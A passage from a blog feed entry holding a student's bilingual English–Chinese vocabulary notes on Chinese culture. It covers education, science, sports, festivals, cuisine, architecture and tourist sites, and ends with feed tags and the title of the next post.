<li>
<p>moral, intellectual, physical and aesthetical developments</p>
<blockquote>
<p>德智体美发展</p>
</blockquote>
</li>
</ul>
<h4 id="Pre-School-Education"><a class="header-anchor" href="#Pre-School-Education">¶</a>Pre-School Education</h4>
<blockquote>
<p>学前教育</p>
</blockquote>
<ul>
<li>
<p>The main forms of China’s pre-school education are nurseries and kindergartens.</p>
<blockquote>
<p>中国学前教育的主要形式是托儿所和幼儿园。</p>
</blockquote>
</li>
</ul>
<h4 id="Nine-Year-Compulsory-Education-九年义务教育"><a class="header-anchor" href="#Nine-Year-Compulsory-Education-九年义务教育">¶</a>Nine-Year Compulsory Education (九年义务教育)</h4>
<ul>
<li>the Senior Middle School Entrance Examination / <em>zhongkao</em></li>
</ul>
<blockquote>
<p>中考</p>
</blockquote>
<ul>
<li>
<p>Project Hope</p>
<blockquote>
<p>希望工程</p>
</blockquote>
</li>
</ul>
<h4 id="Senior-Middle-School-and-Secondary-Vocational-School"><a class="header-anchor" href="#Senior-Middle-School-and-Secondary-Vocational-School">¶</a>Senior Middle School and Secondary Vocational School</h4>
<blockquote>
<p>高中和中等职业学校</p>
</blockquote>
<ul>
<li>
<p>liberal arts and science</p>
<blockquote>
<p>文科和理科</p>
</blockquote>
</li>
<li>
<p>the National College Entrance Examination / <em>gaokao</em></p>
<blockquote>
<p>高考</p>
</blockquote>
</li>
</ul>
<h4 id="Higher-Education"><a class="header-anchor" href="#Higher-Education">¶</a>Higher Education</h4>
<ul>
<li>
<p><em>taixue</em></p>
<blockquote>
<p>太学</p>
</blockquote>
</li>
<li>
<p><em>guozijian</em></p>
<blockquote>
<p>国子监</p>
</blockquote>
</li>
<li>
<p>a bachelor’s degree</p>
<blockquote>
<p>学士学位</p>
</blockquote>
</li>
<li>
<p>a master’s degree</p>
<blockquote>
<p>硕士学位</p>
</blockquote>
</li>
<li>
<p>a doctoral degree</p>
<blockquote>
<p>博士学位</p>
</blockquote>
</li>
<li>
<p>key institution</p>
<blockquote>
<p>重点大学</p>
</blockquote>
</li>
<li>
<p>world-class university</p>
<blockquote>
<p>世界一流大学</p>
</blockquote>
</li>
</ul>
<h4 id="Adult-Education"><a class="header-anchor" href="#Adult-Education">¶</a>Adult Education</h4>
<blockquote>
<p>成人教育</p>
</blockquote>
<h4 id="Special-Education"><a class="header-anchor" href="#Special-Education">¶</a>Special Education</h4>
<blockquote>
<p>特殊教育</p>
</blockquote>
<h4 id="Vocational-Education"><a class="header-anchor" href="#Vocational-Education">¶</a>Vocational Education</h4>
<blockquote>
<p>职业教育</p>
</blockquote>
<h4 id="Education-for-Ethnic-Minority-Groups"><a class="header-anchor" href="#Education-for-Ethnic-Minority-Groups">¶</a>Education for Ethnic Minority Groups</h4>
<blockquote>
<p>少数民族教育</p>
</blockquote>
<h3 id="International-Exchanges-and-Cooperation"><a class="header-anchor" href="#International-Exchanges-and-Cooperation">¶</a>International Exchanges and Cooperation</h3>
<ul>
<li>
<p>international communication and cooperation in education</p>
<blockquote>
<p>国际教育交流与合作</p>
</blockquote>
</li>
<li>
<p>international academic communication and cooperation</p>
<blockquote>
<p>国际学术交流与合作</p>
</blockquote>
</li>
</ul>
<h4 id="Other-Exchanges-and-Programmes"><a class="header-anchor" href="#Other-Exchanges-and-Programmes">¶</a>Other Exchanges and Programmes</h4>
<h4 id="Confucius-Institute"><a class="header-anchor" href="#Confucius-Institute">¶</a>Confucius Institute</h4>
<blockquote>
<p>孔子学院</p>
</blockquote>
<ul>
<li>
<p>promote and disseminate Chinese culture and Chinese language education</p>
<blockquote>
<p>推广和传播中华文化和汉语教育</p>
</blockquote>
</li>
</ul>
<h2 id="CHAPTER-5Science-Technology"><a class="header-anchor" href="#CHAPTER-5Science-Technology">¶</a>CHAPTER 5	Science &amp; Technology</h2>
<h3 id="Ancient-Science-and-Technology"><a class="header-anchor" href="#Ancient-Science-and-Technology">¶</a>Ancient Science and Technology</h3>
<ul>
<li>
<p>porcelain</p>
<blockquote>
<p>瓷器</p>
</blockquote>
</li>
<li>
<p>advanced irrigation</p>
<blockquote>
<p>先进的灌溉业</p>
</blockquote>
</li>
</ul>
<h3 id="Four-Great-Inventions"><a class="header-anchor" href="#Four-Great-Inventions">¶</a>Four Great Inventions</h3>
<ul>
<li>
<p>Compass</p>
<blockquote>
<p>司南</p>
</blockquote>
</li>
<li>
<p>Gunpowder</p>
<blockquote>
<p>火药</p>
</blockquote>
</li>
<li>
<p>Paper-Making</p>
<blockquote>
<p>造纸术</p>
</blockquote>
</li>
<li>
<p>Printing</p>
<blockquote>
<p>印刷术</p>
</blockquote>
<ul>
<li>
<p>block printing</p>
<blockquote>
<p>雕版印刷</p>
</blockquote>
</li>
<li>
<p>movable type printing</p>
<blockquote>
<p>活字印刷</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<h4 id="Traditional-Chinese-Medicine-TCM"><a class="header-anchor" href="#Traditional-Chinese-Medicine-TCM">¶</a>Traditional Chinese Medicine (TCM)</h4>
<blockquote>
<p>中药</p>
</blockquote>
<ul>
<li>
<p>acupuncture</p>
<blockquote>
<p>针灸</p>
</blockquote>
</li>
<li>
<p>massage</p>
<blockquote>
<p>按摩</p>
</blockquote>
</li>
<li>
<p>The most famous medical experts:</p>
<ul>
<li>
<p>Bian Que</p>
<blockquote>
<p>扁鹊</p>
</blockquote>
<ul>
<li>
<p>four methods of diagnosis</p>
<blockquote>
<p>四诊</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>Hua Tuo</p>
<blockquote>
<p>华佗</p>
</blockquote>
<ul>
<li>
<p><em>mafeisan</em></p>
<blockquote>
<p>麻沸散</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>Zhang Zhongjing</p>
<blockquote>
<p>张仲景</p>
</blockquote>
<ul>
<li>
<p><em>On Diseases</em></p>
<blockquote>
<p>《伤寒杂病论》</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>Li Shizhen</p>
<blockquote>
<p>李时珍</p>
</blockquote>
<ul>
<li>
<p><em>Compendium of Materia Medica</em></p>
<blockquote>
<p>《本草纲目》</p>
</blockquote>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="Other-Impressive-Ancient-Inventions"><a class="header-anchor" href="#Other-Impressive-Ancient-Inventions">¶</a>Other Impressive Ancient Inventions</h4>
<ul>
<li>
<p>firework</p>
<blockquote>
<p>烟花</p>
</blockquote>
</li>
<li>
<p>silk</p>
<blockquote>
<p>丝绸</p>
</blockquote>
</li>
<li>
<p>Porcelain</p>
<blockquote>
<p>瓷器</p>
</blockquote>
</li>
<li>
<p><em>Weiqi</em></p>
<blockquote>
<p>围棋</p>
</blockquote>
</li>
</ul>
<h3 id="Modern-Scientific-and-Technological-Achievements"><a class="header-anchor" href="#Modern-Scientific-and-Technological-Achievements">¶</a>Modern Scientific and Technological Achievements</h3>
<ul>
<li>
<p>Westernisation Movement</p>
<blockquote>
<p>洋务运动</p>
</blockquote>
</li>
<li>
<p>Atomic Energy</p>
<blockquote>
<p>核能</p>
</blockquote>
</li>
<li>
<p>Nuclear and Hydrogen Bombs</p>
<blockquote>
<p>核弹和氢弹</p>
</blockquote>
</li>
<li>
<p>First Man-Made Satellite</p>
<blockquote>
<p>第一颗人造卫星</p>
</blockquote>
</li>
<li>
<p>Yuan Longping and Hybrid Rice</p>
<blockquote>
<p>袁隆平和杂交水稻</p>
</blockquote>
</li>
<li>
<p>Shenzhou Spacecraft and <em>Tiangong-1</em></p>
<blockquote>
<p>“神舟”飞船和天宫一号</p>
</blockquote>
</li>
</ul>
<h2 id="CHAPTER-6Sports"><a class="header-anchor" href="#CHAPTER-6Sports">¶</a>CHAPTER 6	Sports</h2>
<ul>
<li>
<p>Chinese kung fu</p>
<blockquote>
<p>中国功夫</p>
</blockquote>
</li>
<li>
<p><em>tai chi chuan</em> / shadow boxing</p>
<blockquote>
<p>太极拳</p>
</blockquote>
</li>
<li>
<p>nationwide physical fitness</p>
<blockquote>
<p>全民健身</p>
</blockquote>
</li>
</ul>
<h3 id="Traditional-Physical-Culture"><a class="header-anchor" href="#Traditional-Physical-Culture">¶</a>Traditional Physical Culture</h3>
<h4 id="Sports-in-Ancient-Times"><a class="header-anchor" href="#Sports-in-Ancient-Times">¶</a>Sports in Ancient Times</h4>
<ul>
<li>
<p>the men of letters</p>
<blockquote>
<p>文人墨客</p>
</blockquote>
</li>
<li>
<p><em>cuju</em></p>
<blockquote>
<p>蹴鞠</p>
</blockquote>
</li>
<li>
<p>vulgar villain</p>
<blockquote>
<p>市井流氓</p>
</blockquote>
</li>
</ul>
<h4 id="Ethnic-Minority-Sports"><a class="header-anchor" href="#Ethnic-Minority-Sports">¶</a>Ethnic Minority Sports</h4>
<ul>
<li>
<p>horsemanship</p>
<blockquote>
<p>马术</p>
</blockquote>
</li>
<li>
<p>shuttlecock kicking</p>
<blockquote>
<p>踢毽子</p>
</blockquote>
</li>
<li>
<p>tug-of-war</p>
<blockquote>
<p>拔河</p>
</blockquote>
</li>
<li>
<p>walking on stilts</p>
<blockquote>
<p>踩高跷</p>
</blockquote>
</li>
<li>
<p><em>yangge</em></p>
<blockquote>
<p>秧歌</p>
</blockquote>
</li>
</ul>
<h3 id="Traditional-Physical-Activities"><a class="header-anchor" href="#Traditional-Physical-Activities">¶</a>Traditional Physical Activities</h3>
<ul>
<li>
<p>martial arts</p>
<blockquote>
<p>武术</p>
</blockquote>
</li>
</ul>
<h4 id="Distinguished-Forms-of-Chinese-Martial-Arts"><a class="header-anchor" href="#Distinguished-Forms-of-Chinese-Martial-Arts">¶</a>Distinguished Forms of Chinese Martial Arts</h4>
<ul>
<li>
<p>Shaolin Boxing</p>
<blockquote>
<p>少林拳</p>
</blockquote>
</li>
<li>
<p><em>Tai Chi Chuan</em></p>
<blockquote>
<p>太极拳</p>
</blockquote>
</li>
<li>
<p><em>Qigong</em></p>
<blockquote>
<p>气功</p>
</blockquote>
</li>
</ul>
<h4 id="Superstars-of-Modern-Martial-Arts"><a class="header-anchor" href="#Superstars-of-Modern-Martial-Arts">¶</a>Superstars of Modern Martial Arts</h4>
<ul>
<li>
<p>Bruce Lee, Jackie Chan and Jet Li</p>
<blockquote>
<p>李小龙，成龙， 李连杰</p>
</blockquote>
</li>
</ul>
<h3 id="National-Physical-Fitness"><a class="header-anchor" href="#National-Physical-Fitness">¶</a>National Physical Fitness</h3>
<ul>
<li>
<p>Kite flying</p>
<blockquote>
<p>放风筝</p>
</blockquote>
</li>
<li>
<p>Horse racing</p>
<blockquote>
<p>赛马</p>
</blockquote>
</li>
<li>
<p><em>yangge</em></p>
<blockquote>
<p>秧歌</p>
</blockquote>
</li>
<li>
<p>Rope skipping</p>
<blockquote>
<p>跳绳</p>
</blockquote>
</li>
</ul>
<h3 id="The-Olympic-Games-and-China"><a class="header-anchor" href="#The-Olympic-Games-and-China">¶</a>The Olympic Games and China</h3>
<h3 id="China’s-Outstanding-Competitive-Sports"><a class="header-anchor" href="#China’s-Outstanding-Competitive-Sports">¶</a>China’s Outstanding Competitive Sports</h3>
<ul>
<li>
<p>Table Tennis / ping-pong</p>
<blockquote>
<p>乒乓球</p>
</blockquote>
</li>
<li>
<p>Badminton</p>
<blockquote>
<p>羽毛球</p>
</blockquote>
</li>
<li>
<p>Volleyball</p>
<blockquote>
<p>排球</p>
</blockquote>
</li>
<li>
<p>Gymnastics</p>
<blockquote>
<p>体操</p>
</blockquote>
</li>
<li>
<p>Diving</p>
<blockquote>
<p>跳水</p>
</blockquote>
</li>
</ul>
<h1>Part 3 Folk Customs</h1>
<ul>
<li>
<p>Characterized by diverse styles, rich cultural meanings and a long history, traditional Chinese festivals constitute an important and brilliant part of Chinese culture.</p>
<blockquote>
<p>中国传统节日风格多样，文化内涵丰富，历史悠久，是中华文化的重要组成部分。</p>
</blockquote>
</li>
<li>
<p>Cuisine in China is, in essence, an expression of Chinese festivals and daily life. It is a harmonious integration of colour, aroma, taste, and shape. A Chinese banquet always typifies Chinese culture and culinary arts that have been perfected over centuries.</p>
<blockquote>
<p>从本质上讲，中国的美食是中国节日和日常生活的表现。它是色、香、味、形的和谐统一。中国的宴会总是代表着经过几个世纪完善的中国文化和烹饪艺术。</p>
</blockquote>
</li>
<li>
<p>Ancient structure life the Great Wall, the Forbidden City, and stone-arched bridges spread across the country. Varied styles of domestic architecture have witnessed many generations’ happiness and filial piety.</p>
<blockquote>
<p>长城、紫禁城、石拱桥等古建筑遍布全国。各种风格的国内建筑见证了几代人的幸福和孝顺。</p>
</blockquote>
</li>
</ul>
<h2 id="CHAPTER-7Traditional-Festivals"><a class="header-anchor" href="#CHAPTER-7Traditional-Festivals">¶</a>CHAPTER 7	Traditional Festivals</h2>
<ul>
<li>
<p>traditional Chinese festival</p>
<blockquote>
<p>中国传统节日</p>
</blockquote>
</li>
<li>
<p>the Spring Festival</p>
<blockquote>
<p>春节</p>
</blockquote>
</li>
<li>
<p>the Lantern Festival</p>
<blockquote>
<p>元宵节</p>
</blockquote>
</li>
<li>
<p>the Qingming Festival / Clear and Bright Day</p>
<blockquote>
<p>清明节</p>
</blockquote>
</li>
<li>
<p>the Dragon Boat Festival</p>
<blockquote>
<p>端午节</p>
</blockquote>
</li>
<li>
<p>the Double Seventh Festival / China’s Valentine’s Day</p>
<blockquote>
<p>七夕节</p>
</blockquote>
</li>
<li>
<p>the Mid-Autumn Festival</p>
<blockquote>
<p>中秋节</p>
</blockquote>
</li>
<li>
<p>the Double Ninth Festival</p>
<blockquote>
<p>重阳节</p>
</blockquote>
</li>
</ul>
<h3 id="Major-Traditional-Festivals"><a class="header-anchor" href="#Major-Traditional-Festivals">¶</a>Major Traditional Festivals</h3>
<h4 id="Spring-Festival"><a class="header-anchor" href="#Spring-Festival">¶</a>Spring Festival</h4>
<ul>
<li>
<p>It falls on the first day of the first lunar month each year.</p>
<blockquote>
<p>春节是在每年农历正月的第一天。</p>
</blockquote>
</li>
<li>
<p>Spring Festival Eve</p>
<blockquote>
<p>除夕</p>
</blockquote>
</li>
<li>
<p>seven days off</p>
<blockquote>
<p>七天假期</p>
</blockquote>
</li>
<li>
<p>bring along the old and the young</p>
<blockquote>
<p>扶老携幼</p>
</blockquote>
</li>
<li>
<p>auspiciousness</p>
<blockquote>
<p>吉祥</p>
</blockquote>
</li>
<li>
<p>relatives and friends</p>
<blockquote>
<p>亲朋好友</p>
</blockquote>
</li>
<li>
<p>Spring Festival couplets written on red paper</p>
<blockquote>
<p>春联</p>
</blockquote>
</li>
<li>
<p>set off firecrackers / burn firecrackers</p>
<blockquote>
<p>放鞭炮</p>
</blockquote>
</li>
<li>
<p>regards and congratulations</p>
<blockquote>
<p>问候与祝贺</p>
</blockquote>
</li>
<li>
<p><em>laba</em> porridge</p>
<blockquote>
<p>腊八粥</p>
</blockquote>
</li>
<li>
<p>date</p>
<blockquote>
<p>枣</p>
</blockquote>
</li>
<li>
<p>Preliminary Eve</p>
<blockquote>
<p>小年夜</p>
</blockquote>
</li>
<li>
<p>Sacrifices are offered to the Kitchen God.</p>
<blockquote>
<p>祭灶</p>
</blockquote>
</li>
<li>
<p>completely clean the indoors and outdoors of their homes</p>
<blockquote>
<p>大扫除</p>
</blockquote>
</li>
<li>
<p>traditional Chinese paper-cut</p>
<blockquote>
<p>中国传统剪纸</p>
</blockquote>
</li>
<li>
<p>poetic couplets</p>
<blockquote>
<p>对联</p>
</blockquote>
</li>
<li>
<p>get-together dinner / reunion dinner</p>
<blockquote>
<p>年夜饭</p>
</blockquote>
</li>
<li>
<p><em>Niangao</em> means “higher and higher, one year after another”.</p>
<blockquote>
<p>年糕寓意为“一年一年节节高”</p>
</blockquote>
</li>
<li>
<p>bid farewell to the old and usher in the new</p>
<blockquote>
<p>辞旧迎新</p>
</blockquote>
</li>
<li>
<p>the Spring Festival Gala</p>
<blockquote>
<p>春晚</p>
</blockquote>
</li>
<li>
<p>the Chinese both at home and abroad</p>
<blockquote>
<p>海内外华人</p>
</blockquote>
</li>
<li>
<p>extend greetings to sb.</p>
<blockquote>
<p>问候某人</p>
</blockquote>
</li>
<li>
<p>solar term</p>
<blockquote>
<p>节气</p>
</blockquote>
</li>
<li>
<p>folk performance</p>
<blockquote>
<p>民俗表演</p>
</blockquote>
</li>
</ul>
<h4 id="Lantern-Festival"><a class="header-anchor" href="#Lantern-Festival">¶</a>Lantern Festival</h4>
<ul>
<li>
<p>The Lantern Festival, celebrated on the 15th day of the first lunar month, is closely related to the Spring Festival.</p>
<blockquote>
<p>元宵节在农历正月十五这一天庆祝，与春节密切相关。</p>
</blockquote>
</li>
<li>
<p>guess riddles pasted onto lanterns</p>
<blockquote>
<p>猜灯谜</p>
</blockquote>
</li>
<li>
<p>make ice lanterns</p>
<blockquote>
<p>做冰灯</p>
</blockquote>
</li>
<li>
<p><em>yuanxiao</em> / <em>tangyuan</em></p>
<blockquote>
<p>元宵 / 汤圆</p>
</blockquote>
</li>
</ul>
<h4 id="Qingming-Festival"><a class="header-anchor" href="#Qingming-Festival">¶</a>Qingming Festival</h4>
<ul>
<li>
<p>The Qingming Festival (or Clear and Bright Day) is a day for mourning the dead.</p>
<blockquote>
<p>清明节是哀悼逝者的节日。</p>
</blockquote>
</li>
</ul>
<h5 id="Legend-of-the-Festival"><a class="header-anchor" href="#Legend-of-the-Festival">¶</a>Legend of the Festival</h5>
<ul>
<li>
<p>The Hanshi Day (or Cold Food Day)</p>
<blockquote>
<p>寒食节</p>
</blockquote>
</li>
</ul>
<h5 id="Activities-of-the-Qingming-Festival"><a class="header-anchor" href="#Activities-of-the-Qingming-Festival">¶</a>Activities of the Qingming Festival</h5>
<ul>
<li>
<p>tomb sweeping</p>
<blockquote>
<p>扫墓</p>
</blockquote>
</li>
<li>
<p>set out offerings of food and paper gifts</p>
<blockquote>
<p>供奉食物和纸制礼物</p>
</blockquote>
</li>
<li>
<p>abstain from lighting fires</p>
<blockquote>
<p>不生明火</p>
</blockquote>
</li>
<li>
<p>The Qingming Festival is also known as an occasion for kite flying and playing on the swing in China.</p>
<blockquote>
<p>在中国，清明节也是放风筝和荡秋千的节日。</p>
</blockquote>
</li>
</ul>
<h4 id="Dragon-Boat-Festival"><a class="header-anchor" href="#Dragon-Boat-Festival">¶</a>Dragon Boat Festival</h4>
<ul>
<li>
<p>The Dragon Boat Festival, also called the <em>Duanwu</em> Festival, falls on the fifth day of the fifth lunar month and is celebrated everywhere in China.</p>
<blockquote>
<p>端午节，又称端午节，在农历五月初五，中国各地都会庆祝。</p>
</blockquote>
</li>
<li>
<p><em>zongzi</em></p>
<blockquote>
<p>粽子</p>
</blockquote>
</li>
<li>
<p>realgar wine</p>
<blockquote>
<p>雄黄酒</p>
</blockquote>
</li>
<li>
<p>wormwood</p>
<blockquote>
<p>艾蒿</p>
</blockquote>
</li>
<li>
<p>fragrant pouches</p>
<blockquote>
<p>香袋</p>
</blockquote>
</li>
<li>
<p>dragon boat racing</p>
<blockquote>
<p>龙舟赛</p>
</blockquote>
</li>
</ul>
<h4 id="Double-Seventh-Festival"><a class="header-anchor" href="#Double-Seventh-Festival">¶</a>Double Seventh Festival</h4>
<ul>
<li>
<p>The Double Seventh Festival, on the seventh day of the seventh lunar month, is a traditional festival of romance.</p>
<blockquote>
<p>农历七月初七，是一个浪漫的传统节日。</p>
</blockquote>
</li>
<li>
<p>the Milky Way</p>
<blockquote>
<p>银河</p>
</blockquote>
</li>
<li>
<p>the Weaver Maid</p>
<blockquote>
<p>织女</p>
</blockquote>
</li>
<li>
<p>the Cowherd</p>
<blockquote>
<p>牛郎</p>
</blockquote>
</li>
</ul>
<h4 id="Mid-Autumn-Festival"><a class="header-anchor" href="#Mid-Autumn-Festival">¶</a>Mid-Autumn Festival</h4>
<ul>
<li>
<p>The Mid-Autumn Festival falls on the 15th day of the eighth lunar month.</p>
<blockquote>
<p>中秋节在农历八月十五。</p>
</blockquote>
</li>
<li>
<p>moon cake</p>
<blockquote>
<p>月饼</p>
</blockquote>
</li>
<li>
<p>appreciate the full and bright moon</p>
<blockquote>
<p>赏月</p>
</blockquote>
</li>
<li>
<p><em>I raise my head, the splendid moon I see; Then droop my head and sink to dreams of my hometown.</em></p>
<blockquote>
<p>举头望明月，低头思故乡</p>
</blockquote>
</li>
<li>
<p><em>My one wish for you, then, is long, life; And a share in this loveliness (the moon) far, far away.</em></p>
<blockquote>
<p>但愿人长久，千里共婵娟</p>
</blockquote>
</li>
</ul>
<h4 id="Double-Ninth-Festival"><a class="header-anchor" href="#Double-Ninth-Festival">¶</a>Double Ninth Festival</h4>
<ul>
<li>
<p>The Double Ninth Festival or <em>Chongyang</em> Festival is celebraeted on the ninth day of the ninth lunar month.</p>
<blockquote>
<p>重阳节实在农历九月初九庆祝的</p>
</blockquote>
</li>
<li>
<p>Senior Citizen’s Day</p>
<blockquote>
<p>老人节</p>
</blockquote>
</li>
</ul>
<h3 id="Ethnic-Minority-Festivals"><a class="header-anchor" href="#Ethnic-Minority-Festivals">¶</a>Ethnic Minority Festivals</h3>
<ul>
<li>
<p>Water-Splashing Festival</p>
<blockquote>
<p>泼水节</p>
</blockquote>
</li>
<li>
<p>Nadam Fair</p>
<blockquote>
<p>那达慕大会</p>
</blockquote>
</li>
<li>
<p>Torch Festival</p>
<blockquote>
<p>火把节</p>
</blockquote>
</li>
</ul>
<blockquote>
<p>下面还有好多少数民族节日，都挺有意思，可惜时间不够了（指快考试了，所以先skip，后面有机会的话再补上&gt; o &lt;</p>
</blockquote>
<h3 id="Public-Holidays-and-Traditional-Festivals"><a class="header-anchor" href="#Public-Holidays-and-Traditional-Festivals">¶</a>Public Holidays and Traditional Festivals</h3>
<ul>
<li>
<p>the New Year’s Day</p>
<blockquote>
<p>元旦</p>
</blockquote>
</li>
<li>
<p>May Day</p>
<blockquote>
<p>劳动节</p>
</blockquote>
</li>
<li>
<p>the National Day</p>
<blockquote>
<p>国庆节</p>
</blockquote>
</li>
</ul>
<h2 id="CHAPTER-8Culinary-Culture"><a class="header-anchor" href="#CHAPTER-8Culinary-Culture">¶</a>CHAPTER 8	Culinary Culture</h2>
<blockquote>
<p>饮食文化</p>
</blockquote>
<ul>
<li>
<p>eight regional cuisines</p>
<blockquote>
<p>中国八大菜系</p>
</blockquote>
<ul>
<li>
<p>Shandong Cuisine → <em>Lucai</em></p>
<blockquote>
<p>鲁菜</p>
</blockquote>
</li>
<li>
<p>Sichuan Cuisine → <em>Chuancai</em></p>
<blockquote>
<p>川菜</p>
</blockquote>
</li>
<li>
<p>Guangdong Cuisine → <em>Yuecai</em></p>
<blockquote>
<p>粤菜</p>
</blockquote>
</li>
<li>
<p>Fujian Cuisine → <em>Mincai</em></p>
<blockquote>
<p>闽菜</p>
</blockquote>
</li>
<li>
<p>Jiangsu Cuisine → <em>Sucai</em></p>
<blockquote>
<p>苏菜</p>
</blockquote>
</li>
<li>
<p>Zhejiang Cuisine → <em>Zhecai</em></p>
<blockquote>
<p>浙菜</p>
</blockquote>
</li>
<li>
<p>Anhui Cuisine → <em>Huicai</em></p>
<blockquote>
<p>徽菜</p>
</blockquote>
</li>
<li>
<p>Hunan Cuisine → <em>Xiangcai</em></p>
<blockquote>
<p>湘菜</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>Colour, Aroma, and Taste</p>
<blockquote>
<p>色香味</p>
</blockquote>
</li>
<li>
<p>seasonging</p>
<blockquote>
<p>调味品</p>
</blockquote>
</li>
<li>
<p><em>A Bite in China</em></p>
<blockquote>
<p>《舌尖上的中国》</p>
</blockquote>
</li>
<li>
<p>table manners</p>
<blockquote>
<p>餐桌礼仪</p>
</blockquote>
</li>
<li>
<p>“Drink first to show respect”</p>
<blockquote>
<p>先干为敬</p>
</blockquote>
</li>
<li>
<p>Chinese Chopsticks</p>
<blockquote>
<p>筷子</p>
</blockquote>
</li>
<li>
<p>Chinese Tea</p>
<blockquote>
<p>中国茶</p>
</blockquote>
<ul>
<li>
<p><em>gong fu</em> tea</p>
<blockquote>
<p>功夫茶</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<h2 id="CHAPTER-9Costume-Adornment"><a class="header-anchor" href="#CHAPTER-9Costume-Adornment">¶</a>CHAPTER 9	Costume &amp; Adornment</h2>
<p>据老师说不考，先skip</p>
<h2 id="CHAPTER-10Architecture"><a class="header-anchor" href="#CHAPTER-10Architecture">¶</a>CHAPTER 10	Architecture</h2>
<ul>
<li>
<p>Beijing Quadrangles</p>
<blockquote>
<p>北京四合院</p>
</blockquote>
</li>
<li>
<p>Shanxi Cave Dwellings</p>
<blockquote>
<p>窑洞</p>
</blockquote>
</li>
<li>
<p>Hakka Earth Buildings</p>
<blockquote>
<p>土楼</p>
</blockquote>
</li>
<li>
<p>Mongolian Yurts</p>
<blockquote>
<p>蒙古包</p>
</blockquote>
</li>
<li>
<p>The Stone Arch Bridge</p>
<blockquote>
<p>石拱桥</p>
</blockquote>
</li>
<li>
<p>Chinese Stone Lions</p>
<blockquote>
<p>石狮子</p>
</blockquote>
</li>
<li>
<p>Efang Palace</p>
<blockquote>
<p>阿房宫</p>
</blockquote>
</li>
</ul>
<h1>Part 4 Tourism</h1>
<ul>
<li>
<p>China has a large number of wonderful tourist cities, some of which have imposing imperial palaces, some are blessed with splendid natural and cultural heritages, and other boast colourful folk customs.</p>
<blockquote>
<p>中国有许多精彩的旅游城市，有的拥有雄伟的皇宫，有的拥有灿烂的自然和文化遗产，还有的拥有丰富多彩的民俗风情。</p>
</blockquote>
</li>
<li>
<p>There are many cities that were once the ancient capitals. The famous ones are Beijing, Xi’ an, Hangzhou, and Nanjing, which are well-known for their splendid buildings, cultural relics, and historic sites.</p>
<blockquote>
<p>有许多曾经是古都的城市。著名的城市有北京、西安、杭州和南京，这些城市以其辉煌的建筑、文物和历史遗迹而闻名。</p>
</blockquote>
</li>
<li>
<p>Other famous cities like Shanghai, Kunming, Guilin and Lhasa, with their distinguished features in scenery, custom or modern lifestyle, leave visitors with the feeling that they should have come earlier.</p>
<blockquote>
<p>上海、昆明、桂林、拉萨等其他著名城市以其独特的风景、风情和现代生活方式，让游客觉得应该早点来。</p>
</blockquote>
</li>
</ul>
<h2 id="CHAPTER-11Major-Tourist-Cities"><a class="header-anchor" href="#CHAPTER-11Major-Tourist-Cities">¶</a>CHAPTER 11	Major Tourist Cities</h2>
<ul>
<li>
<p>Terracotta Army of Emperor Qinshihuang</p>
<blockquote>
<p>兵马俑</p>
</blockquote>
</li>
<li>
<p>Forest of Steles</p>
<blockquote>
<p>西安碑林博物馆</p>
</blockquote>
</li>
<li>
<p>Nanjing Massacre Memorial Hall</p>
<blockquote>
<p>南京大屠杀遇难同胞纪念馆</p>
</blockquote>
</li>
<li>
<p>Forbidden City</p>
<blockquote>
<p>紫禁城 / 故宫</p>
</blockquote>
</li>
<li>
<p>Tian’anmen Square</p>
<blockquote>
<p>天安门广场</p>
</blockquote>
</li>
<li>
<p>Temple of Heaven</p>
<blockquote>
<p>天坛</p>
</blockquote>
</li>
<li>
<p>Summer Palace</p>
<blockquote>
<p>颐和园</p>
</blockquote>
</li>
<li>
<p>Great Wall</p>
<blockquote>
<p>长城</p>
</blockquote>
</li>
<li>
<p>Ming Tombs</p>
<blockquote>
<p>明十三陵</p>
</blockquote>
</li>
<li>
<p>West Lake in Hangzhou</p>
<blockquote>
<p>杭州西湖</p>
</blockquote>
</li>
<li>
<p>Lingyin Temple</p>
<blockquote>
<p>灵隐寺</p>
</blockquote>
</li>
<li>
<p>Confucius Temple</p>
<blockquote>
<p>孔庙</p>
</blockquote>
</li>
<li>
<p>The Bund</p>
<blockquote>
<p>外滩</p>
</blockquote>
</li>
<li>
<p>Oriental Pearl TV Tower</p>
<blockquote>
<p>东方明珠电视塔</p>
</blockquote>
</li>
<li>
<p>Dianchi Lake</p>
<blockquote>
<p>滇池</p>
</blockquote>
</li>
<li>
<p>Stone Forest</p>
<blockquote>
<p>石林</p>
</blockquote>
</li>
<li>
<p>Lijiang River</p>
<blockquote>
<p>漓江</p>
</blockquote>
</li>
<li>
<p>Potala Palace</p>
<blockquote>
<p>布达拉宫</p>
</blockquote>
</li>
</ul>
<h2 id="CHAPTER-12World-Heritage-Sites"><a class="header-anchor" href="#CHAPTER-12World-Heritage-Sites">¶</a>CHAPTER 12	World Heritage Sites</h2>
<ul>
<li>
<p>World Cultural Heritage List</p>
<blockquote>
<p>世界文化遗产名录</p>
</blockquote>
</li>
<li>
<p>Mausoleum of the First Qin Emperor</p>
<blockquote>
<p>秦始皇陵</p>
</blockquote>
</li>
<li>
<p>Mogao Caves</p>
<blockquote>
<p>莫高窟</p>
</blockquote>
</li>
<li>
<p>Mount Taishan</p>
<blockquote>
<p>泰山</p>
</blockquote>
</li>
<li>
<p>Old Town of Lijiang</p>
<blockquote>
<p>丽江古城</p>
</blockquote>
</li>
<li>
<p>Mount Wuyi</p>
<blockquote>
<p>武夷山</p>
</blockquote>
</li>
<li>
<p>Longmen Grottos</p>
<blockquote>
<p>龙门石窟</p>
</blockquote>
</li>
<li>
<p>Fujian <em>Tulou</em></p>
<blockquote>
<p>福建土楼</p>
</blockquote>
</li>
<li>
<p>West Lake Cultural Landscape of Hangzhou</p>
<blockquote>
<p>杭州西湖文化景观</p>
</blockquote>
</li>
<li>
<p>Five Sacred Mountains</p>
<blockquote>
<p>五岳 【泰山、华山、恒山、衡山、嵩山】</p>
</blockquote>
</li>
</ul>
<h1>课后翻译合集</h1>
]]></content>
      <categories>
        <category>English resources</category>
        <category>traditional Chinese culture</category>
      </categories>
      <tags>
        <tag>English</tag>
        <tag>Chinese culture</tag>
      </tags>
  </entry>
  <entry>
    <title>【DataWhale | AIGC方向】从零入门AI生图原理&amp;实践</title>
